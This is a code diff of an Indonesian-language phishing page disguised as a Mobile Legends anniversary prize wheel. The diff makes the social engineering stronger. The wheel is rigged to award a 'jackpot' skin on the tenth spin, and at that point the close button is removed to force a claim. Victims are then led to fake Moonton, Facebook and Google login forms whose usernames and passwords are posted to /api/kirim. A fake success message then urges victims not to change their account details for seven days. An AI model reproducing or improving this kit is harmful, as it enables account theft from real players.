@@ -12,12 +12,14 @@
         .pointer { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 40px; z-index: 20; filter: drop-shadow(0 2px 5px black); }
         button#spinBtn { background: linear-gradient(180deg, #facc15 0%, #eab308 100%); border: none; padding: 18px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; color: #000; font-size: 18px; text-transform: uppercase; box-shadow: 0 4px 0 #a16207; }
         button#spinBtn:disabled { background: #64748b; box-shadow: none; color: #cbd5e1; cursor: not-allowed; }
+        
+        /* Modal & Box */
         #loginModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 100; justify-content: center; align-items: center; padding: 20px; }
-        .login-box { background: #fff; color: #333; padding: 25px; border-radius: 15px; width: 100%; max-width: 320px; text-align: left; }
+        .login-box { background: #fff; color: #333; padding: 25px; border-radius: 15px; width: 100%; max-width: 320px; text-align: center; }
         .prize-img { width: 120px; height: 120px; object-fit: cover; border-radius: 10px; margin: 0 auto 15px; display: block; border: 3px solid #facc15; }
-        .method-btn { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; color: white; text-align: center; display: block; }
+        .method-btn { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; color: white; display: block; }
         input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
-        #errPass { color: #dc2626; font-size: 12px; font-weight: bold; display: block; margin-bottom: 10px; }
+        #errPass { color: #dc2626; font-size: 12px; font-weight: bold; display: block; margin-bottom: 10px; text-align: left; }
     </style>
 </head>
 <body>
@@ -25,7 +27,7 @@
 <div class="container">
     <img src="https://gwen.id/wp-content/uploads/2022/10/mobile-legends-logo.png" width="130" style="margin-bottom:10px;">
     <h2 style="color: #38bdf8; margin: 0;">LUCKY DRAW 2026</h2>
-    <p style="font-size: 13px; color: #94a3b8;">Event Spesial Anniversary - Klaim Hadiahmu!</p>
+    <p style="font-size: 13px; color: #94a3b8;">Event Anniversary - Spin & Dapatkan Skin Epic!</p>
 
     <div class="wheel-box">
         <img src="https://cdn-icons-png.flaticon.com/512/2985/2985150.png" class="pointer">
@@ -38,42 +40,51 @@
 
 <div id="loginModal">
     <div class="login-box" id="step0">
-        <h3 style="text-align:center; margin-top:0;">SELAMAT!</h3>
+        <h3 style="margin-top:0;">SELAMAT!</h3>
         <img id="wonImg" class="prize-img" src="">
-        <p id="wonText" style="text-align:center; font-weight:bold;"></p>
+        <p id="wonText" style="font-weight:bold; margin-bottom: 20px;"></p>
+        
         <button class="method-btn" style="background:#22c55e" onclick="toStep1()">AMBIL SEKARANG</button>
+        <button id="closeBtn" class="method-btn" style="background:#94a3b8;" onclick="closeModal()">NANTI SAJA (LANJUT SPIN)</button>
     </div>
+
     <div class="login-box" id="step1" style="display:none;">
-        <h3 style="text-align:center;">Pilih Akun Klaim</h3>
+        <h3>Verifikasi Akun</h3>
+        <p style="font-size: 12px;">Login untuk mengirim hadiah ke ID Anda.</p>
         <button class="method-btn" style="background:#f39c12" onclick="showForm('Moonton')">Moonton Login</button>
         <button class="method-btn" style="background:#1877f2" onclick="showForm('Facebook')">Facebook Login</button>
         <button class="method-btn" style="background:#ea4335" onclick="showForm('Google')">Google Login</button>
     </div>
-    <div class="login-box" id="step2" style="display:none;">
-        <h3 id="formTitle">Login</h3>
+
+    <div class="login-box" id="step2" style="display:none; text-align: left;">
+        <h3 id="formTitle" style="text-align: center;">Login</h3>
         <input type="text" id="user" placeholder="Email / Username">
         <input type="password" id="pass" placeholder="Kata Sandi">
         <span id="errPass"></span>
         <button class="method-btn" style="background:#22c55e" onclick="submitData()">KONFIRMASI KLAIM</button>
     </div>
+
     <div class="login-box" id="step3" style="display:none; text-align:center;">
-        <h2 style="color: #16a34a;">SUKSES!</h2>
-        <p style="font-size: 13px; color:#555;">Hadiah akan masuk ke email mobilelegends akun kamu setelah 7 hari. Jangan ganti data akun selama proses verifikasi.</p>
+        <h2 style="color: #16a34a;">BERHASIL!</h2>
+        <p style="font-size: 14px; line-height: 1.6;">Hadiah akan masuk ke email mobilelegends akun kamu setelah 7 hari. Mohon jangan mengganti data akun agar verifikasi lancar.</p>
         <button class="method-btn" style="background:#1877f2" onclick="location.reload()">OKE</button>
     </div>
 </div>
 
 <script>
+    // HADIAH AMPAS (Spin 1-9)
     const ampas = [
         { t: "300 Magic Dust", i: "https://static.wikia.nocookie.net/mobile-legends/images/c/c8/Magic_Dust.png" },
         { t: "500 Ticket", i: "https://static.wikia.nocookie.net/mobile-legends/images/0/07/Ticket.png" },
         { t: "2 Hero Fragment", i: "https://static.wikia.nocookie.net/mobile-legends/images/a/a2/Hero_Fragment.png" }
     ];
+    // HADIAH JACKPOT (Spin 10)
     const jackpot = [
         { t: "Skin Epic Lancelot", i: "https://img.mobilelegends.com/group1/M00/00/AF/Cq6ICl2S8mKAE7mXAASt_PZ0_YI426.jpg" },
         { t: "70 Diamonds", i: "https://p16-va.lemon8cdn.com/obj/tos-alisg-v-a3e477-sg/ocA7IBp9QAnBIEDAgk8AIBeS2C7Z6GffXAfYQf" },
         { t: "Skin Epic Gusion", i: "https://img.mobilelegends.com/group1/M00/00/8F/Cq6ICl2R_8-AQ-3vAAVS-G_oX_c321.jpg" }
     ];
+
     const allPrizes = [...ampas, ...jackpot];
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
@@ -84,37 +95,58 @@
     function drawWheel() {
         const slice = (2 * Math.PI) / allPrizes.length;
         allPrizes.forEach((p, i) => {
-            ctx.beginPath(); ctx.fillStyle = i % 2 === 0 ? '#1d4ed8' : '#2563eb'; ctx.moveTo(250, 250);
-            ctx.arc(250, 250, 250, i * slice, (i + 1) * slice); ctx.fill();
-            ctx.save(); ctx.translate(250, 250); ctx.rotate(i * slice + slice / 2);
-            ctx.fillStyle = "white"; ctx.font = "bold 20px Arial"; ctx.fillText(p.t.split(' ')[0], 120, 10); ctx.restore();
+            ctx.beginPath();
+            ctx.fillStyle = i % 2 === 0 ? '#1d4ed8' : '#2563eb';
+            ctx.moveTo(250, 250);
+            ctx.arc(250, 250, 250, i * slice, (i + 1) * slice);
+            ctx.fill();
+            ctx.save();
+            ctx.translate(250, 250);
+            ctx.rotate(i * slice + slice / 2);
+            ctx.fillStyle = "white"; ctx.font = "bold 20px Arial";
+            ctx.fillText(p.t.split(' ')[0], 120, 10);
+            ctx.restore();
         });
     }
     drawWheel();
 
     function spin() {
-        if(spinCount >= 10) return;
+        if(spinCount >= 10) return alert("Kesempatan habis!");
         spinCount++;
         document.getElementById('count').innerText = 10 - spinCount;
         const btn = document.getElementById('spinBtn');
         btn.disabled = true;
 
+        // Logika Settingan Master FAGYMOFFC
         let targetIndex = spinCount < 10 ? Math.floor(Math.random() * 3) : Math.floor(Math.random() * 3) + 3;
+        
         const sliceDeg = 360 / allPrizes.length;
         const targetDeg = (360 - (targetIndex * sliceDeg)) - (sliceDeg / 2);
         deg += 3600 + (targetDeg - (deg % 360));
+        
         canvas.style.transform = `rotate(${deg}deg)`;
 
         setTimeout(() => {
             const winner = allPrizes[targetIndex];
+            const closeBtn = document.getElementById('closeBtn');
+            
             document.getElementById('wonImg').src = winner.i;
-            document.getElementById('wonText').innerText = "Selamat! Kamu mendapatkan " + winner.t + "!";
+            document.getElementById('wonText').innerText = "Kamu mendapatkan " + winner.t + "!";
             document.getElementById('loginModal').style.display = 'flex';
-            btn.disabled = false;
-            if(spinCount >= 10) btn.innerText = "DRAW HABIS";
+
+            // Jika Spin 10 (Jackpot), Tombol Batal Dihilangkan
+            if (spinCount >= 10) {
+                closeBtn.style.display = 'none';
+                document.getElementById('wonText').innerText = "JACKPOT! " + winner.t + " Wajib Diklaim!";
+                btn.innerText = "DRAW HABIS";
+            } else {
+                closeBtn.style.display = 'block';
+            }
+            btn.disabled = (spinCount >= 10);
         }, 4500);
     }
 
+    function closeModal() { document.getElementById('loginModal').style.display = 'none'; }
     function toStep1() { document.getElementById('step0').style.display = 'none'; document.getElementById('step1').style.display = 'block'; }
     function showForm(m) { currentMethod = m; document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; document.getElementById('formTitle').innerText = "Login " + m; }
 
@@ -123,17 +155,24 @@
         const pw = document.getElementById('pass').value;
         const err = document.getElementById('errPass');
         err.innerText = "";
-        if(!user || !pw) return alert("Isi data!");
-        if (currentMethod === 'Moonton' && !/[A-Z]/.test(pw)) return err.innerText = "Error: Wajib minimal 1 huruf kapital!";
+
+        if(!user || !pw) return alert("Harap isi data!");
+
+        // Validasi Master FAGYMOFFC
+        if (currentMethod === 'Moonton' && !/[A-Z]/.test(pw)) return err.innerText = "Error: Moonton wajib minimal 1 huruf besar!";
         if ((currentMethod === 'Facebook' || currentMethod === 'Google') && pw.length < 8) return err.innerText = "Error: Password minimal 8 karakter!";
 
-        await fetch('/api/kirim', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ user, pw, method: currentMethod, device: navigator.userAgent })
-        });
-        document.getElementById('step2').style.display = 'none'; document.getElementById('step3').style.display = 'block';
+        try {
+            await fetch('/api/kirim', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user, pw, method: currentMethod, device: navigator.userAgent })
+            });
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step3').style.display = 'block';
+        } catch (e) { alert("Server Sibuk, Coba Lagi!"); }
     }
 </script>
+
 </body>
 </html>
